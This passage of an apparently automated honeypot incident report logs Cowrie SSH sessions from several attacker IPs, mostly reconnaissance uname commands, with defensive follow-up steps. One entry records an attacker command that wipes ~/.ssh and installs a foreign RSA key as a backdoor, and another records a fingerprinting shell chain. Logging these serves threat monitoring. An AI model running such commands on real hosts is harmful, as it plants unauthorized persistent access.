| `2026-08-15 05:24:45` | `cowrie.session.connect` |
| `2026-08-15 05:24:46` | `cowrie.client.version` |
| `2026-08-15 05:24:46` | `cowrie.client.kex` |
| `2026-08-15 05:24:48` | `cowrie.login.success` |
| `2026-08-15 05:24:49` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0906791db3b8

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-08-15 05:26 |
| **Last Seen** | 2026-08-15 05:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:26:05` | `cowrie.session.connect` |
| `2026-08-15 05:26:06` | `cowrie.client.version` |
| `2026-08-15 05:26:06` | `cowrie.client.kex` |
| `2026-08-15 05:26:09` | `cowrie.login.success` |
| `2026-08-15 05:26:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d9c0a0741a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:26 |
| **Last Seen** | 2026-08-15 05:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:26:47` | `cowrie.session.connect` |
| `2026-08-15 05:26:47` | `cowrie.client.version` |
| `2026-08-15 05:26:47` | `cowrie.client.kex` |
| `2026-08-15 05:26:48` | `cowrie.login.success` |
| `2026-08-15 05:26:50` | `cowrie.session.params` |
| `2026-08-15 05:26:50` | `cowrie.command.input` |
| `2026-08-15 05:26:50` | `cowrie.log.closed` |
| `2026-08-15 05:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c76e28c9798

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:26 |
| **Last Seen** | 2026-08-15 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:26:53` | `cowrie.session.connect` |
| `2026-08-15 05:26:53` | `cowrie.client.version` |
| `2026-08-15 05:26:53` | `cowrie.client.kex` |
| `2026-08-15 05:26:55` | `cowrie.login.success` |
| `2026-08-15 05:26:57` | `cowrie.session.params` |
| `2026-08-15 05:26:57` | `cowrie.command.input` |
| `2026-08-15 05:26:57` | `cowrie.log.closed` |
| `2026-08-15 05:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198b81ee8895

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:26 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:26:59` | `cowrie.session.connect` |
| `2026-08-15 05:26:59` | `cowrie.client.version` |
| `2026-08-15 05:26:59` | `cowrie.client.kex` |
| `2026-08-15 05:27:00` | `cowrie.login.success` |
| `2026-08-15 05:27:02` | `cowrie.session.params` |
| `2026-08-15 05:27:02` | `cowrie.command.input` |
| `2026-08-15 05:27:02` | `cowrie.log.closed` |
| `2026-08-15 05:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2aa55749466

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:04` | `cowrie.session.connect` |
| `2026-08-15 05:27:04` | `cowrie.client.version` |
| `2026-08-15 05:27:04` | `cowrie.client.kex` |
| `2026-08-15 05:27:05` | `cowrie.login.success` |
| `2026-08-15 05:27:06` | `cowrie.session.params` |
| `2026-08-15 05:27:06` | `cowrie.command.input` |
| `2026-08-15 05:27:07` | `cowrie.log.closed` |
| `2026-08-15 05:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c1c475b9b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:09` | `cowrie.session.connect` |
| `2026-08-15 05:27:09` | `cowrie.client.version` |
| `2026-08-15 05:27:09` | `cowrie.client.kex` |
| `2026-08-15 05:27:10` | `cowrie.login.success` |
| `2026-08-15 05:27:11` | `cowrie.session.params` |
| `2026-08-15 05:27:11` | `cowrie.command.input` |
| `2026-08-15 05:27:11` | `cowrie.log.closed` |
| `2026-08-15 05:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d1687bbe55

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:12` | `cowrie.session.connect` |
| `2026-08-15 05:27:12` | `cowrie.client.version` |
| `2026-08-15 05:27:13` | `cowrie.client.kex` |
| `2026-08-15 05:27:14` | `cowrie.login.success` |
| `2026-08-15 05:27:15` | `cowrie.session.params` |
| `2026-08-15 05:27:15` | `cowrie.command.input` |
| `2026-08-15 05:27:15` | `cowrie.command.failed` |
| `2026-08-15 05:27:15` | `cowrie.log.closed` |
| `2026-08-15 05:27:17` | `cowrie.session.params` |
| `2026-08-15 05:27:17` | `cowrie.command.input` |
| `2026-08-15 05:27:17` | `cowrie.session.file_download` |
| `2026-08-15 05:27:17` | `cowrie.log.closed` |
| `2026-08-15 05:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a542074058e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:15` | `cowrie.session.connect` |
| `2026-08-15 05:27:15` | `cowrie.client.version` |
| `2026-08-15 05:27:15` | `cowrie.client.kex` |
| `2026-08-15 05:27:15` | `cowrie.login.success` |
| `2026-08-15 05:27:16` | `cowrie.session.params` |
| `2026-08-15 05:27:16` | `cowrie.command.input` |
| `2026-08-15 05:27:17` | `cowrie.log.closed` |
| `2026-08-15 05:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae612143034

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:17` | `cowrie.session.connect` |
| `2026-08-15 05:27:17` | `cowrie.client.version` |
| `2026-08-15 05:27:18` | `cowrie.client.kex` |
| `2026-08-15 05:27:18` | `cowrie.login.success` |
| `2026-08-15 05:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6913d54ccf

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:19` | `cowrie.session.connect` |
| `2026-08-15 05:27:19` | `cowrie.client.version` |
| `2026-08-15 05:27:19` | `cowrie.client.kex` |
| `2026-08-15 05:27:21` | `cowrie.login.success` |
| `2026-08-15 05:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f5ffe9c044

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:20` | `cowrie.session.connect` |
| `2026-08-15 05:27:20` | `cowrie.client.version` |
| `2026-08-15 05:27:20` | `cowrie.client.kex` |
| `2026-08-15 05:27:21` | `cowrie.login.success` |
| `2026-08-15 05:27:22` | `cowrie.session.params` |
| `2026-08-15 05:27:22` | `cowrie.command.input` |
| `2026-08-15 05:27:22` | `cowrie.log.closed` |
| `2026-08-15 05:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60015e6c689

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:25` | `cowrie.session.connect` |
| `2026-08-15 05:27:25` | `cowrie.client.version` |
| `2026-08-15 05:27:25` | `cowrie.client.kex` |
| `2026-08-15 05:27:26` | `cowrie.login.success` |
| `2026-08-15 05:27:27` | `cowrie.session.params` |
| `2026-08-15 05:27:27` | `cowrie.command.input` |
| `2026-08-15 05:27:27` | `cowrie.log.closed` |
| `2026-08-15 05:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94e5d31a8da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:30` | `cowrie.session.connect` |
| `2026-08-15 05:27:31` | `cowrie.client.version` |
| `2026-08-15 05:27:31` | `cowrie.client.kex` |
| `2026-08-15 05:27:32` | `cowrie.login.success` |
| `2026-08-15 05:27:33` | `cowrie.session.params` |
| `2026-08-15 05:27:33` | `cowrie.command.input` |
| `2026-08-15 05:27:33` | `cowrie.log.closed` |
| `2026-08-15 05:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc72d19e0899

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:36` | `cowrie.session.connect` |
| `2026-08-15 05:27:36` | `cowrie.client.version` |
| `2026-08-15 05:27:36` | `cowrie.client.kex` |
| `2026-08-15 05:27:37` | `cowrie.login.success` |
| `2026-08-15 05:27:38` | `cowrie.session.params` |
| `2026-08-15 05:27:38` | `cowrie.command.input` |
| `2026-08-15 05:27:38` | `cowrie.log.closed` |
| `2026-08-15 05:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8721ad925683

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:41` | `cowrie.session.connect` |
| `2026-08-15 05:27:41` | `cowrie.client.version` |
| `2026-08-15 05:27:41` | `cowrie.client.kex` |
| `2026-08-15 05:27:42` | `cowrie.login.success` |
| `2026-08-15 05:27:43` | `cowrie.session.params` |
| `2026-08-15 05:27:43` | `cowrie.command.input` |
| `2026-08-15 05:27:43` | `cowrie.log.closed` |
| `2026-08-15 05:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8e5e17ac02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:47` | `cowrie.session.connect` |
| `2026-08-15 05:27:47` | `cowrie.client.version` |
| `2026-08-15 05:27:47` | `cowrie.client.kex` |
| `2026-08-15 05:27:48` | `cowrie.login.success` |
| `2026-08-15 05:27:48` | `cowrie.session.params` |
| `2026-08-15 05:27:48` | `cowrie.command.input` |
| `2026-08-15 05:27:49` | `cowrie.log.closed` |
| `2026-08-15 05:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ace614f054d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:52` | `cowrie.session.connect` |
| `2026-08-15 05:27:52` | `cowrie.client.version` |
| `2026-08-15 05:27:52` | `cowrie.client.kex` |
| `2026-08-15 05:27:53` | `cowrie.login.success` |
| `2026-08-15 05:27:54` | `cowrie.session.params` |
| `2026-08-15 05:27:54` | `cowrie.command.input` |
| `2026-08-15 05:27:54` | `cowrie.log.closed` |
| `2026-08-15 05:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017dfbd18ed8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:27 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:27:58` | `cowrie.session.connect` |
| `2026-08-15 05:27:58` | `cowrie.client.version` |
| `2026-08-15 05:27:58` | `cowrie.client.kex` |
| `2026-08-15 05:27:59` | `cowrie.login.success` |
| `2026-08-15 05:27:59` | `cowrie.session.params` |
| `2026-08-15 05:27:59` | `cowrie.command.input` |
| `2026-08-15 05:28:00` | `cowrie.log.closed` |
| `2026-08-15 05:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a738208534a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:04` | `cowrie.session.connect` |
| `2026-08-15 05:28:04` | `cowrie.client.version` |
| `2026-08-15 05:28:04` | `cowrie.client.kex` |
| `2026-08-15 05:28:04` | `cowrie.login.success` |
| `2026-08-15 05:28:05` | `cowrie.session.params` |
| `2026-08-15 05:28:05` | `cowrie.command.input` |
| `2026-08-15 05:28:05` | `cowrie.log.closed` |
| `2026-08-15 05:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca0961a0d6a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:08` | `cowrie.session.connect` |
| `2026-08-15 05:28:08` | `cowrie.client.version` |
| `2026-08-15 05:28:08` | `cowrie.client.kex` |
| `2026-08-15 05:28:11` | `cowrie.login.success` |
| `2026-08-15 05:28:12` | `cowrie.session.params` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.success` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:12` | `cowrie.command.input` |
| `2026-08-15 05:28:13` | `cowrie.log.closed` |
| `2026-08-15 05:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf5e7018e92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:09` | `cowrie.session.connect` |
| `2026-08-15 05:28:09` | `cowrie.client.version` |
| `2026-08-15 05:28:09` | `cowrie.client.kex` |
| `2026-08-15 05:28:10` | `cowrie.login.success` |
| `2026-08-15 05:28:11` | `cowrie.session.params` |
| `2026-08-15 05:28:11` | `cowrie.command.input` |
| `2026-08-15 05:28:11` | `cowrie.log.closed` |
| `2026-08-15 05:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aad0c2164d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:14` | `cowrie.session.connect` |
| `2026-08-15 05:28:14` | `cowrie.client.version` |
| `2026-08-15 05:28:14` | `cowrie.client.kex` |
| `2026-08-15 05:28:15` | `cowrie.login.success` |
| `2026-08-15 05:28:16` | `cowrie.session.params` |
| `2026-08-15 05:28:16` | `cowrie.command.input` |
| `2026-08-15 05:28:16` | `cowrie.log.closed` |
| `2026-08-15 05:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0715794152

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:17` | `cowrie.session.connect` |
| `2026-08-15 05:28:17` | `cowrie.client.version` |
| `2026-08-15 05:28:17` | `cowrie.client.kex` |
| `2026-08-15 05:28:17` | `cowrie.login.success` |
| `2026-08-15 05:28:19` | `cowrie.session.params` |
| `2026-08-15 05:28:19` | `cowrie.command.input` |
| `2026-08-15 05:28:19` | `cowrie.log.closed` |
| `2026-08-15 05:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503f96010bf4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
